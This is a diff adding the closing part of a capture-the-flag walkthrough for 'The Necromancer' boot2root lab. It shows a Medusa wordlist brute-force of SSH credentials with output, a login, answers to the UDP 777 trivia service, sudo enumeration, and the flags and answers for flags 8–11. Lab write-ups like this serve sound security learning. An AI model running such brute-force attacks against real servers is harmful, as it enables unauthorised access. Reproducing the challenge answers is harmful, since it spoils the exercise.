@@ -1143,10 +1143,230 @@ iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"
 ```
 
 The seventh flag is **flag7{9e5494108d10bbd5f9e7ae52239546c4}**. The plaintext for 9e5494108d10bbd5f9e7ae52239546c4 is demonslayer.
-After setting the SNMP OID, the SNMP and HTTP ports are closed but now SSH is now open
+After setting the SNMP OID, the SNMP and HTTP ports are closed but now SSH is now open. It's likely the case that we need to log in as is demonslayer. With no password provided I started Medusa to bruteforce the password which ended up being 12345678
 
 ```
 root@kali:~# unicornscan -mU -I 192.168.56.101:a;unicornscan -mT -I 192.168.56.101:a
 TCP open 192.168.56.101:22  ttl 64
 TCP open	             ssh[   22]		from 192.168.56.101  ttl 64 
+root@kali:~# medusa -u demonslayer -P /usr/share/wordlists/metasploit/unix_passwords.txt -M ssh -h 192.168.56.101
+Medusa v2.0 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: demonslayer (1 of 1, 0 complete) Password: 123456 (1 of 1005 complete)
+ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: demonslayer (1 of 1, 0 complete) Password: 12345 (2 of 1005 complete)
+ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: demonslayer (1 of 1, 0 complete) Password: 123456789 (3 of 1005 complete)
+---8<---
+ACCOUNT FOUND: [ssh] Host: 192.168.56.101 User: demonslayer Password: 12345678 [SUCCESS]
 ```
+
+After logging in we are greated to some nice ascii art and a file in the home directory named flag8.txt.
+Reading the contents of flag8.txt reveals that there is a service running on UDP port 777.
+
+```
+root@kali:~# ssh demonslayer@192.168.56.101
+demonslayer@192.168.56.101's password: 
+
+          .                                                      .
+        .n                   .                 .                  n.
+  .   .dP                  dP                   9b                 9b.    .
+ 4    qXb         .       dX                     Xb       .        dXp     t
+dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
+9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
+ 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
+  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
+    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
+        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
+                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
+                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
+                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
+                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
+                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
+                     `'      9XXXXXX(   )XXXXXXP      `'
+                              XXXX X.`v'.X XXXX
+                              XP^X'`b   d'`X^XX
+                              X. 9  `   '  P )X
+                              `b  `       '  d'
+                               `             '                       
+                               THE NECROMANCER!
+                                 by  @xerubus
+
+$ find . 
+.
+./.ssh
+./.ssh/authorized_keys
+./.Xdefaults
+./.cshrc
+./.cvsrc
+./.login
+./.mailrc
+./.profile
+./flag8.txt
+$ cat flag8.txt                                                                                                                                                                                                                              
+You enter the Necromancer's Lair!
+
+A stench of decay fills this place.  
+
+Jars filled with parts of creatures litter the bookshelves.
+
+A fire with flames of green burns coldly in the distance.
+
+Standing in the middle of the room with his back to you is the Necromancer.  
+
+In front of him lies a corpse, indistinguishable from any living creature you have seen before.
+
+He holds a staff in one hand, and the flickering object in the other.
+
+"You are a fool to follow me here!  Do you not know who I am!"
+
+The necromancer turns to face you.  Dark words fill the air!
+
+"You are damned already my friend.  Now prepare for your own death!" 
+
+Defend yourself!  Counter attack the Necromancer's spells at u777!
+```
+
+The service on UDP 777 is going to ask a series of questions which we have to answer to proceed.
+All of the answer can be found with some googling.
+
+* The first answer was found on the [Tsurani](https://en.wikipedia.org/wiki/Tsurani#Great_Ones) Wikipedia page under the Great Ones section.
+* The second answer was found on a [Gaia Online](http://www.gaiaonline.com/profiles/doctor-johann-faust-viii/19782706/) profile page.
+* The third answer was found on the [List of Old Kingdom characters](https://en.wikipedia.org/wiki/List_of_Old_Kingdom_characters#Hedge) Wikipedia page under the Hedge section.
+
+```
+$ nc -u localhost 777
+       
+
+
+** You only have 3 hitpoints left! **
+
+Defend yourself from the Necromancer's Spells!
+
+Where do the Black Robes practice magic of the Greater Path?  Kelewan
+
+
+flag8{55a6af2ca3fee9f2fef81d20743bda2c}
+
+
+
+** You only have 3 hitpoints left! **
+
+Defend yourself from the Necromancer's Spells!
+
+Who did Johann Faust VIII make a deal with?  Mephistopheles
+
+
+flag9{713587e17e796209d1df4c9c2c2d2966}
+
+
+
+** You only have 3 hitpoints left! **
+
+Defend yourself from the Necromancer's Spells!
+
+Who is tricked into passing the Ninth Gate?  Hedge
+
+
+flag10{8dc6486d2c63cafcdc6efbba2be98ee4}
+
+A great flash of light knocks you to the ground; momentarily blinding you!
+
+As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.
+
+An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.
+
+The room is silent.
+
+You walk over to where the Necromancer once stood.
+
+On the ground is a small vile.
+```
+
+After answering the three questions, I noticed that in the necromancers home folder there is a new hidden file named .smallvile.
+Reading the file it hints that we have been given new powers. After a bit more enumeration we find that we've been granted sudoers right to cat flag11.txt in root's home directory.
+
+```
+$ find . 
+.
+./.ssh
+./.ssh/authorized_keys
+./.Xdefaults
+./.cshrc
+./.cvsrc
+./.login
+./.mailrc
+./.profile
+./flag8.txt
+./.smallvile
+$ cat .smallvile                                                                                                                                                                                                                             
+
+
+You pick up the small vile.
+
+Inside of it you can see a green liquid.
+
+Opening the vile releases a pleasant odour into the air.
+
+You drink the elixir and feel a great power within your veins!
+
+
+$ sudo -l
+Matching Defaults entries for demonslayer on thenecromancer:
+    env_keep+="FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK"
+
+User demonslayer may run the following commands on thenecromancer:
+    (ALL) NOPASSWD: /bin/cat /root/flag11.txt
+```
+
+cat'ing the contents of flag11.txt reveals we've successfully completed the boot2root.
+
+```
+$ sudo /bin/cat /root/flag11.txt
+
+
+
+Suddenly you feel dizzy and fall to the ground!
+
+As you open your eyes you find yourself staring at a computer screen.
+
+Congratulations!!! You have conquered......
+
+          .                                                      .
+        .n                   .                 .                  n.
+  .   .dP                  dP                   9b                 9b.    .
+ 4    qXb         .       dX                     Xb       .        dXp     t
+dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
+9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
+ 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
+  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
+    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
+        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
+                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
+                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
+                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
+                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
+                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
+                     `'      9XXXXXX(   )XXXXXXP      `'
+                              XXXX X.`v'.X XXXX
+                              XP^X'`b   d'`X^XX
+                              X. 9  `   '  P )X
+                              `b  `       '  d'
+                               `             '                       
+                               THE NECROMANCER!
+                                 by  @xerubus
+
+                   flag11{42c35828545b926e79a36493938ab1b1}
+
+
+Big shout out to Dook and Bull for being test bunnies.
+
+Cheers OJ for the obfuscation help.
+
+Thanks to SecTalks Brisbane and their sponsors for making these CTF challenges possible.
+
+"========================================="
+"  xerubus (@xerubus) - www.mogozobo.com  "
+"========================================="
+```
+Credits:
+
+* Thanks to [xerubus](https://twitter.com/xerubus) for creating the boot2root.
